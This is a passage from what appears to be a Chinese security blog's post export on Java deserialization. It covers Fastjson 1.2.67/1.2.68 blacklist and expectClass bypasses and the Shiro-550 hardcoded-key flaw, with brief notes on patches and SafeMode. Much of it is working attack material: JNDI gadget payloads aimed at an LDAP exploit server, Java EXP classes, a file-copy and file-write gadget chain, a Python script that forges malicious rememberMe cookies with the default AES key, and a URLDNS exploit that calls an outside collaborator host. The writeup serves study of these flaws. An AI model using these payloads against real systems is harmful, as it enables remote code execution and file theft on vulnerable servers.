\"&#123;\\\"@type\\\":\\\"br.com.anteros.dbcp.AnterosDBCPConfig\\\",\\\"healthCheckRegistry\\\":\\\"ldap://localhost:1389/Exploit\\\"&#125;\";  \n//        String poc = \"&#123;\\\"@type\\\":\\\"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\\\",\" +  \n//                \"\\\"properties\\\": &#123;\\\"@type\\\":\\\"java.util.Properties\\\",\\\"UserTransaction\\\":\\\"ldap://localhost:1389/Exploit\\\"&#125;&#125;\";  \n JSON.parse(poc);  \n &#125;  \n&#125;\n\n0x04 1.2.67反序列化漏洞（黑名单绕过）前提条件\n开启AutoType；\nFastjson &lt;&#x3D; 1.2.67；\nJNDI注入利用所受的JDK版本限制；\norg.apache.ignite.cache.jta.jndi.CacheJndiTmLookup类需要ignite-core、ignite-jta和jta依赖；\norg.apache.shiro.jndi.JndiObjectFactory类需要shiro-core和slf4j-api依赖；\n\n漏洞原理新Gadget绕过黑名单限制。\norg.apache.ignite.cache.jta.jndi.CacheJndiTmLookup类PoC：\n&#123;\"@type\":\"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup\", \"jndiNames\":[\"ldap://localhost:1389/Exploit\"], \"tm\": &#123;\"$ref\":\"$.tm\"&#125;&#125;\n\norg.apache.shiro.jndi.JndiObjectFactory类PoC：\n&#123;\"@type\":\"org.apache.shiro.jndi.JndiObjectFactory\",\"resourceName\":\"ldap://localhost:1389/Exploit\",\"instance\":&#123;\"$ref\":\"$.instance\"&#125;&#125;\n\nEXP\nimport com.alibaba.fastjson.JSON;  \nimport com.alibaba.fastjson.parser.ParserConfig;  \nimport com.sun.xml.internal.ws.api.ha.StickyFeature;  \n  \npublic class EXP_1267 &#123;  \n    public static void main(String[] args) &#123;  \n        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);  \n String poc = \"&#123;\\\"@type\\\":\\\"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup\\\",\" +  \n                \" \\\"jndiNames\\\":[\\\"ldap://localhost:1234/ExportObject\\\"], \\\"tm\\\": &#123;\\\"$ref\\\":\\\"$.tm\\\"&#125;&#125;\";  \n JSON.parse(poc);  \n &#125;  \n&#125;\n\n0x05 1.2.68反序列化漏洞（expectClass绕过AutoType）\n这个洞可以稍微看一下，感觉是可以结合利用的。\n\n前提条件\nFastjson &lt;&#x3D; 1.2.68；\n利用类必须是expectClass类的子类或实现类，并且不在黑名单中；\n\n漏洞原理本次绕过checkAutoType()函数的关键点在于其第二个参数expectClass，可以通过构造恶意JSON数据、传入某个类作为expectClass参数再传入另一个expectClass类的子类或实现类来实现绕过checkAutoType()函数执行恶意操作。\n简单地说，本次绕过checkAutoType()函数的攻击步骤为：\n\n先传入某个类，其加载成功后将作为expectClass参数传入checkAutoType()函数；\n查找expectClass类的子类或实现类，如果存在这样一个子类或实现类其构造方法或setter方法中存在危险操作则可以被攻击利用；\n\n漏洞复现简单地验证利用expectClass绕过的可行性，先假设Fastjson服务端存在如下实现AutoCloseable接口类的恶意类VulAutoCloseable：\npublic class VulAutoCloseable implements AutoCloseable &#123;\n    public VulAutoCloseable(String cmd) &#123;\n        try &#123;\n            Runtime.getRuntime().exec(cmd);\n        &#125; catch (Exception e) &#123;\n            e.printStackTrace();\n        &#125;\n    &#125;\n \n    @Override\n    public void close() throws Exception &#123;\n \n    &#125;\n&#125;\n\n构造PoC如下：\n&#123;\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"org.example.VulAutoCloseable\",\"cmd\":\"calc\"&#125;\n\n无需开启AutoType，直接成功绕过CheckAutoType()的检测从而触发执行：\n\n\n调试分析直接在CheckAutoType()函数中打断点开始调试。\n第一次是传入 AutoCloseable 类进行校验，这里CheckAutoType()函数的 expectClass 参数是为 null 的：\n\n\n往下，直接从缓存 Mapping 中获取到了 AutoCloseable 类：然后获取到这个 clazz 之后进行了一系列的判断，clazz 是否为 null，以及关于 internalWhite 的判断，internalWhite 就是内部加白的名单，很显然我们这里肯定不是，内部加白的名单一定是非常安全的。\n\n\n然后后面这个判断里面出现了 expectClass，先判断 clazz 是否不是 expectClass 类的继承类且不是 HashMap 类型，是的话抛出异常，否则直接返回该类。\n我们这里没有 expectClass，所以会直接返回 AutoCloseable 类：\n\n\n接着，返回到 DefaultJSONParser 类中获取到 clazz 后再继续执行，根据 AutoCloseable 类获取到反序列化器为 JavaBeanDeserializer，然后应用该反序列化器进行反序列化操作：\n\n\n往里走，调用的是 JavaBeanDeserializer 的 deserialze() 方法进行反序列化操作，其中 type 参数就是传入的 AutoCloseable类，如图：\n\n\n往下的逻辑，就是解析获取 PoC 后面的类的过程。这里看到获取不到对象反序列化器之后，就会进去如图的判断逻辑中，设置 type 参数即 java.lang.AutoCloseable 类为 checkAutoType() 方法的 expectClass 参数来调用 checkAutoType() 函数来获取指定类型，然后在获取指定的反序列化器：\n\n\n此时，第二次进入 checkAutoType() 函数，typeName 参数是 PoC 中第二个指定的类，expectClass 参数则是 PoC 中第一个指定的类：\n\n\n往下，由于java.lang.AutoCloseable类并非其中黑名单中的类，因此expectClassFlag被设置为true：\n\n\n往下，由于expectClassFlag为true且目标类不在内部白名单中，程序进入AutoType开启时的检测逻辑：\n\n\n由于我们定义的 VulAutoCloseable 类不在黑白名单中，因此这段能通过检测并继续往下执行。\n往下，未加载成功目标类，就会进入 AutoType 关闭时的检测逻辑，和上同理，这段能通过检测并继续往下执行：\n\n\n往下，由于expectClassFlag为true，进入如下的loadClass()逻辑来加载目标类，但是由于AutoType关闭且jsonType为false，因此调用loadClass()函数的时候是不开启cache即缓存的：\n\n\n跟进该函数，使用AppClassLoader加载 VulAutoCloseable 类并直接返回：\n\n\n往下，判断是否jsonType、true的话直接添加Mapping缓存并返回类，否则接着判断返回的类是否是ClassLoader、DataSource、RowSet等类的子类，是的话直接抛出异常，这也是过滤大多数JNDI注入Gadget的机制：\n\n\n前面的都能通过，往下，如果expectClass不为null，则判断目标类是否是expectClass类的子类，是的话就添加到Mapping缓存中并直接返回该目标类，否则直接抛出异常导致利用失败，这里就解释了为什么恶意类必须要继承AutoCloseable接口类，因为这里expectClass为AutoCloseable类、因此恶意类必须是AutoCloseable类的子类才能通过这里的判断：\n\n\n\n之后就是结尾处，恶意类的触发\n\n\n\n\n\n简单总结一下：我们在 PoC 里面定义了两个 @type\n\n第一个 @type 进去什么都没有发生；但是第一个 @type 是作为第二个指定的类里面的 expectClass。所以说白了，loadClass 去作用的类是第一个 @type；如果这个 @type 是可控的恶意类，可以造成命令执行攻击。\n并且需要加载的目标类是expectClass类的子类或者实现类时（不在黑名单中）\n实际利用前面漏洞复现只是简单地验证绕过方法的可行性，在实际的攻击利用中，是需要我们去寻找实际可行的利用类的。\n这里直接参考b1ue大佬文章，主要是寻找关于输入输出流的类来写文件，IntputStream和OutputStream都是实现自AutoCloseable接口的。\n\n我寻找 gadget 时的条件是这样的。\n\n需要一个通过 set 方法或构造方法指定文件路径的 OutputStream\n需要一个通过 set 方法或构造方法传入字节数据的 OutputStream，参数类型必须是byte[]、ByteBuffer、String、char[]其中的一个，并且可以通过 set 方法或构造方法传入一个 OutputStream，最后可以通过 write 方法将传入的字节码 write 到传入的 OutputStream\n需要一个通过 set 方法或构造方法传入一个 OutputStream，并且可以通过调用 toString、hashCode、get、set、构造方法 调用传入的 OutputStream 的 close、write 或 flush 方法\n\n以上三个组合在一起就能构造成一个写文件的利用链，我通过扫描了一下 JDK ，找到了符合第一个和第三个条件的类。\n分别是 FileOutputStream 和 ObjectOutputStream，但这两个类选取的构造器，不符合情况，所以只能找到这两个类的子类，或者功能相同的类。\n\n复制文件（任意文件读取漏洞）利用类：org.eclipse.core.internal.localstore.SafeFileOutputStream\n依赖：\n&lt;dependency>  \n &lt;groupId>org.aspectj&lt;/groupId>  \n &lt;artifactId>aspectjtools&lt;/artifactId>  \n &lt;version>1.9.5&lt;/version>  \n&lt;/dependency>\n\n看下SafeFileOutputStream类的源码，其SafeFileOutputStream(java.lang.String, java.lang.String)构造函数判断了如果targetPath文件不存在且tempPath文件存在，就会把tempPath复制到targetPath中，正是利用其构造函数的这个特点来实现Web场景下的任意文件读取：\npublic class SafeFileOutputStream extends OutputStream &#123;\n    protected File temp;\n    protected File target;\n    protected OutputStream output;\n    protected boolean failed;\n    protected static final String EXTENSION = \".bak\";\n \n    public SafeFileOutputStream(File file) throws IOException &#123;\n        this(file.getAbsolutePath(), (String)null);\n    &#125;\n \n    // 该构造函数判断如果targetPath文件不存在且tempPath文件存在，就会把tempPath复制到targetPath中\n    public SafeFileOutputStream(String targetPath, String tempPath) throws IOException &#123;\n        this.failed = false;\n        this.target = new File(targetPath);\n        this.createTempFile(tempPath);\n        if (!this.target.exists()) &#123;\n            if (!this.temp.exists()) &#123;\n                this.output = new BufferedOutputStream(new FileOutputStream(this.target));\n                return;\n            &#125;\n \n            this.copy(this.temp, this.target);\n        &#125;\n \n        this.output = new BufferedOutputStream(new FileOutputStream(this.temp));\n    &#125;\n \n    public void close() throws IOException &#123;\n        try &#123;\n            this.output.close();\n        &#125; catch (IOException var2) &#123;\n            this.failed = true;\n            throw var2;\n        &#125;\n \n        if (this.failed) &#123;\n            this.temp.delete();\n        &#125; else &#123;\n            this.commit();\n        &#125;\n \n    &#125;\n \n    protected void commit() throws IOException &#123;\n        if (this.temp.exists()) &#123;\n            this.target.delete();\n            this.copy(this.temp, this.target);\n            this.temp.delete();\n        &#125;\n    &#125;\n \n    protected void copy(File sourceFile, File destinationFile) throws IOException &#123;\n        if (sourceFile.exists()) &#123;\n            if (!sourceFile.renameTo(destinationFile)) &#123;\n                InputStream source = null;\n                BufferedOutputStream destination = null;\n \n                try &#123;\n                    source = new BufferedInputStream(new FileInputStream(sourceFile));\n                    destination = new BufferedOutputStream(new FileOutputStream(destinationFile));\n                    this.transferStreams(source, destination);\n                    destination.close();\n                &#125; finally &#123;\n                    FileUtil.safeClose(source);\n                    FileUtil.safeClose(destination);\n                &#125;\n \n            &#125;\n        &#125;\n    &#125;\n \n    protected void createTempFile(String tempPath) &#123;\n        if (tempPath == null) &#123;\n            tempPath = this.target.getAbsolutePath() + \".bak\";\n        &#125;\n \n        this.temp = new File(tempPath);\n    &#125;\n \n    public void flush() throws IOException &#123;\n        try &#123;\n            this.output.flush();\n        &#125; catch (IOException var2) &#123;\n            this.failed = true;\n            throw var2;\n        &#125;\n    &#125;\n \n    public String getTempFilePath() &#123;\n        return this.temp.getAbsolutePath();\n    &#125;\n \n    protected void transferStreams(InputStream source, OutputStream destination) throws IOException &#123;\n        byte[] buffer = new byte[8192];\n \n        while(true) &#123;\n            int bytesRead = source.read(buffer);\n            if (bytesRead == -1) &#123;\n                return;\n            &#125;\n \n            destination.write(buffer, 0, bytesRead);\n        &#125;\n    &#125;\n \n    public void write(int b) throws IOException &#123;\n        try &#123;\n            this.output.write(b);\n        &#125; catch (IOException var3) &#123;\n            this.failed = true;\n            throw var3;\n        &#125;\n    &#125;\n&#125;\n\n\n\n写入文件写内容类：com.esotericsoftware.kryo.io.Output\n依赖：\n&lt;dependency>\n    &lt;groupId>com.esotericsoftware&lt;/groupId>\n    &lt;artifactId>kryo&lt;/artifactId>\n    &lt;version>4.0.0&lt;/version>\n&lt;/dependency>\n\nOutput类主要用来写内容，它提供了setBuffer()和setOutputStream()两个setter方法可以用来写入输入流，其中buffer参数值是文件内容，outputStream参数值就是前面的SafeFileOutputStream类对象，而要触发写文件操作则需要调用其flush()函数：\n/** Sets a new OutputStream. The position and total are reset, discarding any buffered bytes.\n * @param outputStream May be null. */\npublic void setOutputStream (OutputStream outputStream) &#123;\n    this.outputStream = outputStream;\n    position = 0;\n    total = 0;\n&#125;\n \n...\n \n/** Sets the buffer that will be written to. &#123;@link #setBuffer(byte[], int)&#125; is called with the specified buffer's length as the\n * maxBufferSize. */\npublic void setBuffer (byte[] buffer) &#123;\n    setBuffer(buffer, buffer.length);\n&#125;\n \n...\n \n/** Writes the buffered bytes to the underlying OutputStream, if any. */\npublic void flush () throws KryoException &#123;\n    if (outputStream == null) return;\n    try &#123;\n        outputStream.write(buffer, 0, position);\n        outputStream.flush();\n    &#125; catch (IOException ex) &#123;\n        throw new KryoException(ex);\n    &#125;\n    total += position;\n    position = 0;\n&#125;\n \n...\n\n如果可以写入文件的话，我们这里可以写入一些恶意文件。\n接着，就是要看怎么触发Output类flush()函数了，flush()函数只有在close()和require()函数被调用时才会触发，其中require()函数在调用write相关函数时会被触发。这也是链子的思维\n其中，找到JDK的ObjectOutputStream类，其内部类BlockDataOutputStream的构造函数中将OutputStream类型参数赋值给out成员变量，而其setBlockDataMode()函数中调用了drain()函数、drain()函数中又调用了out.write()函数，满足前面的需求：\n/**  \n * Creates new BlockDataOutputStream on top of given underlying stream.  \n * Block data mode is turned off by default.  \n */  \n BlockDataOutputStream(OutputStream out) &#123;  \n this.out = out;  \n dout = new DataOutputStream(this);  \n &#125;  \n  \n /**  \n * Sets block data mode to the given mode (true == on, false == off)  \n * and returns the previous mode value.  If the new mode is the same as  \n * the old mode, no action is taken.  If the new mode differs from the  \n * old mode, any buffered data is flushed before switching to the new  \n * mode.  \n */  \n boolean setBlockDataMode(boolean mode) throws IOException &#123;  \n if (blkmode == mode) &#123;  \n return blkmode;  \n &#125;  \n drain();  \n blkmode = mode;  \n return !blkmode;  \n &#125;  \n  \n...  \n  \n /**  \n * Writes all buffered data from this stream to the underlying stream,  \n * but does not flush underlying stream.  \n */  \n void drain() throws IOException &#123;  \n if (pos == 0) &#123;  \n return;  \n &#125;  \n if (blkmode) &#123;  \n writeBlockHeader(pos);  \n &#125;  \n out.write(buf, 0, pos);  \n pos = 0;  \n &#125;\n\n对于setBlockDataMode()函数的调用，在ObjectOutputStream类的有参构造函数中就存在：\npublic ObjectOutputStream(OutputStream out) throws IOException &#123;  \n verifySubclass();  \n bout = new BlockDataOutputStream(out);  \n handles = new HandleTable(10, (float) 3.00);  \n subs = new ReplaceTable(10, (float) 3.00);  \n enableOverride = false;  \n writeStreamHeader();  \n bout.setBlockDataMode(true);  \n if (extendedDebugInfo) &#123;  \n debugInfoStack = new DebugTraceInfoStack();  \n &#125; else &#123;  \n debugInfoStack = null;  \n &#125;  \n&#125;\n\n但是Fastjson优先获取的是ObjectOutputStream类的无参构造函数，因此只能找ObjectOutputStream的继承类来触发了。\n只有有参构造函数的ObjectOutputStream继承类：com.sleepycat.bind.serial.SerialOutput\n依赖：\n&lt;dependency>  \n &lt;groupId>com.sleepycat&lt;/groupId>  \n &lt;artifactId>je&lt;/artifactId>  \n &lt;version>5.0.73&lt;/version>  \n&lt;/dependency>\n\n看到，SerialOutput类的构造函数中是调用了父类ObjectOutputStream的有参构造函数，这就满足了前面的条件了：\npublic SerialOutput(OutputStream out, ClassCatalog classCatalog)  \n throws IOException &#123;  \n  \n super(out);  \n this.classCatalog = classCatalog;  \n  \n /* guarantee that we'll always use the same serialization format */  \n  \n useProtocolVersion(ObjectStreamConstants.PROTOCOL_VERSION_2);  \n&#125;\n\nPoC如下，用到了Fastjson循环引用的技巧来调用：\n这里写入文件内容其实有限制，有的特殊字符并不能直接写入到目标文件中，比如写不进PHP代码等。\n攻击利用成功。\n补丁分析看GitHub官方的diff，主要在ParserConfig.java中：https://github.com/alibaba/fastjson/compare/1.2.68%E2%80%A61.2.69#diff-f140f6d9ec704eccb9f4068af9d536981a644f7d2a6e06a1c50ab5ee078ef6b4\n对比看到expectClass的判断逻辑中，对类名进行了Hash处理再比较哈希黑名单，并且添加了三个类：\n\n\n网上已经有了利用彩虹表碰撞的方式得到的新添加的三个类分别为：\n版本十进制Hash值十六进制Hash值类名1.2.695183404141909004468L0x47ef269aadc650b4Ljava.lang.Runnable1.2.692980334044947851925L0x295c4605fd1eaa95Ljava.lang.Readable1.2.69-1368967840069965882L0xed007300a7b227c6Ljava.lang.AutoCloseable\n\n这就简单粗暴地防住了这几个类导致的绕过问题了。\nSafeMode官方参考：https://github.com/alibaba/fastjson/wiki/fastjson_safemode\n在1.2.68之后的版本，在1.2.68版本中，fastjson增加了safeMode的支持。safeMode打开后，完全禁用autoType。所有的安全修复版本sec10也支持SafeMode配置。\n代码中设置开启SafeMode如下：\nParserConfig.getGlobalInstance().setSafeMode(true);\n\n开启之后，就完全禁用AutoType即@type了，这样就能防御住Fastjson反序列化漏洞了。\n具体的处理逻辑，是放在checkAutoType()函数中的前面，获取是否设置了SafeMode，如果是则直接抛出异常终止运行：\n\n\n0x06 其他一些绕过黑名单的Gadget这里补充下其他一些Gadget，可自行尝试。注意，均需要开启AutoType，且会被JNDI注入利用所受的JDK版本限制。\n1.2.59com.zaxxer.hikari.HikariConfig类PoC：\n&#123;\"@type\":\"com.zaxxer.hikari.HikariConfig\",\"metricRegistry\":\"ldap://localhost:1389/Exploit\"&#125;或&#123;\"@type\":\"com.zaxxer.hikari.HikariConfig\",\"healthCheckRegistry\":\"ldap://localhost:1389/Exploit\"&#125;\n\n1.2.61org.apache.commons.proxy.provider.remoting.SessionBeanProvider类PoC：\n&#123;\"@type\":\"org.apache.commons.proxy.provider.remoting.SessionBeanProvider\",\"jndiName\":\"ldap://localhost:1389/Exploit\",\"Object\":\"a\"&#125;\n\n1.2.62org.apache.cocoon.components.slide.impl.JMSContentInterceptor类PoC：\n&#123;\"@type\":\"org.apache.cocoon.components.slide.impl.JMSContentInterceptor\", \"parameters\": &#123;\"@type\":\"java.util.Hashtable\",\"java.naming.factory.initial\":\"com.sun.jndi.rmi.registry.RegistryContextFactory\",\"topic-factory\":\"ldap://localhost:1389/Exploit\"&#125;, \"namespace\":\"\"&#125;\n\n1.2.68org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig类PoC：\n&#123;\"@type\":\"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig\",\"metricRegistry\":\"ldap://localhost:1389/Exploit\"&#125;或&#123;\"@type\":\"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig\",\"healthCheckRegistry\":\"ldap://localhost:1389/Exploit\"&#125;\n\ncom.caucho.config.types.ResourceRef类PoC：\n&#123;\"@type\":\"com.caucho.config.types.ResourceRef\",\"lookupName\": \"ldap://localhost:1389/Exploit\", \"value\": &#123;\"$ref\":\"$.value\"&#125;&#125;\n\n未知版本org.apache.aries.transaction.jms.RecoverablePooledConnectionFactory类PoC：\n&#123;\"@type\":\"org.apache.aries.transaction.jms.RecoverablePooledConnectionFactory\", \"tmJndiName\": \"ldap://localhost:1389/Exploit\", \"tmFromJndi\": true, \"transactionManager\": &#123;\"$ref\":\"$.transactionManager\"&#125;&#125;\n\norg.apache.aries.transaction.jms.internal.XaPooledConnectionFactory类PoC：\n&#123;\"@type\":\"org.apache.aries.transaction.jms.internal.XaPooledConnectionFactory\", \"tmJndiName\": \"ldap://localhost:1389/Exploit\", \"tmFromJndi\": true, \"transactionManager\": &#123;\"$ref\":\"$.transactionManager\"&#125;&#125;\n\n参考资料Fastjson反序列化漏洞(4)—1.2.68版本 – JohnFrod’s Blog（安全客首发）Fastjson系列六——1.2.48-1.2.68反序列化漏洞 [ Mi1k7ea ]\n","categories":["Java"],"tags":["Java"]},{"title":"Java反序列化Shiro篇01-Shiro550流程分析","url":"/2022/07/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/","content":"Shiro550流程分析\n\nJava 反序列化 Shiro 篇 01-Shiro550 流程分析0x01 前言shiro550 的根本原因：固定 key 加密\n0x02 环境搭建\njdk8u65\nTomcat8\nshiro 1.2.4\n\n漏洞影响版本：Shiro &lt;&#x3D; 1.2.4\n搭建环境这里比较费心思，慢慢来。\njdk8u65 和 tomcat8 的配置比较简单，直接下载，跟着安装就可以。tomcat8 下载这个包\n\n\nTomcat8 在 IDEA 中配置\n这里我们先 clone 一下 P神的项目：https://github.com/phith0n/JavaThings/tree/master/shirodemo\n\n1. 用 IDEA 打开这个项目，去到 Settings 界面如图配置，在 Add 的时候选择 Tomcat Server 这一选项。\n\n\n2. 选择 Project Structure这里 P神 已经把项目弄好了，我们可以看一看。\n\n\n3. 配置 Edit Configurations\n\n4. 运行测试右键 login.jsp，运行之后会有一堆爆红，然后是 404 的界面，这个时候我们点击 IDEA 自带的用浏览器打开前端界面即可，这样就可以访问成功了。\n\n\n登录的 username 和 password 默认是 root 与 secret。\n\n这里还有一点小问题，在用 Burpsuite 抓包的时候会抓不到 localhost 的包，这里我们只需要查看 ipconfig 下的 IPV4 地址，用那个 IP 地址去替换 localhost 就能够抓包了。\n\n0x03 Shiro-550 分析漏洞原理\n勾选 RememberMe 字段，登陆成功的话，返回包 set-Cookie 会有 rememberMe&#x3D;deleteMe 字段，还会有 rememberMe 字段，之后的所有请求中 Cookie 都会有 rememberMe 字段，那么就可以利用这个 rememberMe 进行反序列化，从而 getshell。\n\n\n\nShiro1.2.4 及之前的版本中，AES 加密的密钥默认硬编码在代码里（Shiro-550），Shiro 1.2.4 以上版本官方移除了代码中的默认密钥，要求开发者自己设置，如果开发者没有设置，则默认动态生成，降低了固定密钥泄漏的风险。\n漏洞角度分析 Cookie\n我们还是从一个漏洞发现者的角度出发，而不是跟着 IDEA 打断点走一遍就可以的。\n\n首先在抓包的情况下，我们在拿到这一 Cookie 的时候，很明显能够看到这是经过某种加密的。因为我们平常的 Cookie 都是比较短的，而 shiro RememberMe 字段的 Cookie 太长了。\n\n如此，我们先去分析 Cookie 的加密过程。\n\n\n我们在知晓 Shiro 的加密过程之后，可以人为构造恶意的 Cookie 参数，从而实现命令执行的目的\n这很重要！并不是知道了怎么加密解密之后就可以 RCE 的！\n\n逆向分析解密过程\n要找 Cookie 的加密过程，直接在 IDEA 里面全局搜索 Cookie，去找 Shiro 包里的类。\n\n最后我们找到相关的类是 CookieRememberMeManager，其中，在观察了一圈之后，将目光锁定到 getRememberedSerializedIdentity() 这个方法上。\n\n\n这里的前面，先判断是否为 HTTP 请求，如果是的话，获取 cookie 中 rememberMe 的值，然后判断是否是 deleteMe，不是则判断是否是符合 base64 的编码长度，然后再对其进行 base64 解码，将解码结果返回。\n我们逆向上去，看一下谁调用了 getRememberedSerializedIdentity() 这个方法。\n\n\n找到了 AbstractRememberMeManager 这个接口的 getRememberedPrincipals() 方法。\ngetRememberedPrincipals() 方法的作用域为 PrincipalCollection，一般就是用于聚合多个 Realm 配置的集合。\n这里 393，396 行；393 行 ———— 将 HTTP Requests 里面的 Cookie 拿出来，赋值给 bytes 数组；396 行将 bytes 数组的东西进行 convertBytesToPrincipals() 方法的调用，并将值赋给 principals 变量。\n\n\nconvertBytesToPrincipals() 这个方法将之前的 bytes 数组转换成了认证信息，在 convertBytesToPrincipals() 这个方法当中，很明确地做了两件事，一件是 decrypt 的解密，另一件是 deserialize 的反序列化。\n\n\n\n先进到解密的 decrypt() 方法里面看看。\n\n解密过程之 decrypt() 方法\n\n第 487 行，先是获取了密钥服务，也就是实现 AOP 的实现类，再往后 489 行的 decrypt() 跟进去，发现它是一个接口。我们可以看一下它的参数名\n第一个要加密的数组，第二个是一个 key，说明这是一个对称加密，我们重点去关注一下 key。\n回到之前 decrypt() 方法的第 489 行，两个传参，第一个是 Cookie，第二个是 key，跟进传入的 getDecryptionCipherKey\n最终发现这个东西是个常量，过程如下\n先点进 getDecryptionCipherKey 这个参数，进去之后发现这是一个 btye[] 的方法，返回了 decryptionCipherKey。decryptionCipherKey 这里，我们找一找谁调用了它。\n\n\n跟进去 decryptionCipherKey() 之后，查看谁调用了它，发现是 setDecryptionCipherKey() 方法，这里有点没看懂赋值的原理，所以再往上找一找，看谁调用了 setDecryptionCipherKey() \n\n\n同样的二次跟进，终于找到不一样的东西了。\n\n\n非常显而易见的，第 109 行的 DEFAULT_CIPHER_KEY_BYTES，我们跟进去发现它的一个常量，是一个固定的值。\n\n\n一整条寻找的思路如下图所示，这里我们发现 shiro 进行 Cookie 加密的 AES 算法的密钥是一个常量。\n\n\n解密过程之 deserialize 反序列化在之前 convertBytesToPrincipals() 这个方法的地方，点进去。是一个接口，再看一看接口里面的 deserial 的实现方法有哪些\n\n\n点进 shiro 包的 deserial() 方法，这里面的 deserial() 方法调用了 readObject()，所以这里反序列化的地方是一个很好的入口类。\n至此，Shiro 拿到 HTTP 包里的 Cookie 的解密过程已经梳理地很清楚了，我们再回头看一看那一段 Cookie 是如何产生的，也就是加密过程。\n加密过程\n加密分析这里用的是打断点调试。断点位置打在 AbstractRememberMeManager 接口的 onSuccessfulLogin 方法处。\n\n这里打断点刚开始会有点烦，会判断是否是 HTTP 什么的，所以直接 F8 跳过就好，进入到 if (isRememberMe(token)) 的判断；这个判断这里，简单判断 RememberMe 字段是否为 true，再调用了 rememberIdentity() 方法\n\n\n断点至 297 行时，F7 进入 rememberIdentity() 方法，这里一串调用，保存用户名。\n\n\n\n再回到 rememberIdentity() 方法，跟进this.rememberIdentity(subject, principals)：调试手法如图\n\n\n\n\n\n进入 convertPrincipalsToBytes() 方法，里面和我们之前看的解密里面的 convertBytesToPrincipals() 非常相似，不过将解密变成了加密，将反序列化改成了序列化。\n\n先看序列化的这段，和之前一样反序列化找的过程一致，序列化最后如图\n\n\n\n\n再回去看 encrypt 加密的那一段\n\n\n\n这里我们能够看出加密算法是 AES 了，AES 是一种对称加密算法，继续往下跟，最后是找到加密 Key 用的是一个常量。大致要找的话，思路和之前是一样的\n\n\n后续加密这里，通过 AES 加密之后的 Cookie，拿去 Base64 编码。\n\n\n以上分析就是全过程了 ~\n0x04 Shiro-550 漏洞利用\n这里利用会讲 Shiro-550 与 URLDNS 链、CC6 链、Commons-Beanutils1 链这三种攻击方式的利用。\n\n我们可以先安装一个依赖，在 IDEA 中搜索 “Maven Helper” 即可，分析依赖的效果如图所示。\n\n\n漏洞利用思路\n既然 RCE，或者说弹 shell，是在反序列化的时候触发的。\n\n那我们的攻击就应该是将反序列化的东西，进行 shiro 的一系列加密操作，再把最后的那串东西替换包中的 RememberMe 字段的值。\n这个加密操作的脚本如下\n# －*-* coding:utf-8\n# @Time    :  2022/7/13 17:36\n# @Author  : Drunkbaby\n# @FileName: poc.py\n# @Software: VSCode\n# @Blog    ：https://drun1baby.github.io/\n\nfrom email.mime import base\nfrom pydoc import plain\nimport sys\nimport base64\nfrom turtle import mode\nimport uuid\nfrom random import Random\nfrom Crypto.Cipher import AES\n\n\ndef get_file_data(filename):\n with open(filename, 'rb') as f:\n data = f.read()\n return data\n\ndef aes_enc(data):\n BS = AES.block_size\n pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()\n key = \"kPH+bIxk5D2deZiIxcaaaA==\"\n mode = AES.MODE_CBC\n iv = uuid.uuid4().bytes\n encryptor = AES.new(base64.b64decode(key), mode, iv)\n ciphertext = base64.b64encode(iv + encryptor.encrypt(pad(data)))\n return ciphertext\n\ndef aes_dec(enc_data):\n enc_data = base64.b64decode(enc_data)\n unpad = lambda s: s[:-s[-1]]\n key = \"kPH+bIxk5D2deZiIxcaaaA==\"\n mode = AES.MODE_CBC\n iv = enc_data[:16]\n encryptor = AES.new(base64.b64decode(key), mode, iv)\n plaintext = encryptor.decrypt(enc_data[16:])\n plaintext = unpad(plaintext)\n return plaintext\n\nif __name__ == \"__main__\":\n data = get_file_data(\"ser.bin\")\n print(aes_enc(data))\n\t\n\n\nURLDNS 链通过漏洞原理可以知道，构造 Payload 需要将利用链通过 AES 加密后在 Base64 编码。将 Payload 的值设置为 rememberMe 的 cookie 值，这里借助 ysoserial 中的 URLDNS 链去打，由于 URLDNS 不依赖于 Commons Collections 包，只需要 JDK 的包就行，所以一般用于检测是否存在漏洞。\n\n这里的 EXP 我直接拿出来，是之前在学反射的时候写好的。\n\nimport java.io.*;  \nimport java.lang.reflect.Field;  \nimport java.net.URL;  \nimport java.util.HashMap;  \n  \npublic class URLDNSEXP &#123;  \n    public static void main(String[] args) throws Exception&#123;  \n        HashMap&lt;URL,Integer> hashmap= new HashMap&lt;URL,Integer>();  \n // 这里不要发起请求  \n URL url = new URL(\"http://2twuuia2kxz9bqztec49jpphj8pzdo.oastify.com\");  \n Class c = url.getClass();  \n Field hashcodefile = c.getDeclaredField(\"hashCode\");  \n hashcodefile.setAccessible(true);  \n hashcodefile.set(url,1234);  \n hashmap.put(url,1);  \n // 这里把 hashCode 改为 -1； 通过反射的技术改变已有对象的属性  \n hashcodefile.set(url,-1);  \n serialize(hashmap);  \n //unserialize(\"ser.bin\");  \n &#125;  \n  \n    public static void serialize(Object obj) throws IOException &#123;  \n        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"ser.bin\"));  \n oos.writeObject(obj);  \n &#125;  \n    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException&#123;  \n        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));  \n Object obj = ois.readObject();  \n return obj;  \n &#125;  \n&#125;\n\n第 19 行，先不要进行反序列化的操作，将序列化得到的 ser.bin 放到之前写好的 python 脚本里面跑，如图。\n\n\n再将 AES 加密出来的编码替换包中的 RememberMe Cookie，将 JSESSIONID 删掉，因为当存在 JSESSIONID 时，会忽略 rememberMe。\n\n\n发包之后，我们会收到 DNS 的请求，如图\n\n\n通过 CC11 链攻击\n这里踩了很久的坑，原因我也不知道是为什么，出现了一个，就是字节码一直加载不进去，报错报的是 “Translet 类无法找到 Calc 名”\n\n\n\n后续解决的也很奇怪，修改了 jdk 版本就可以了，我之前是 1.7 的环境，换成了 1.8；\n用 EXP 攻击，编码，发包即可。\n\n\n通过 CB1 链攻击分析过程与 EXP 已经在之前写过了，分析过程就不写了，主要是如何使用的问题，先贴出我们的脚本\nimport 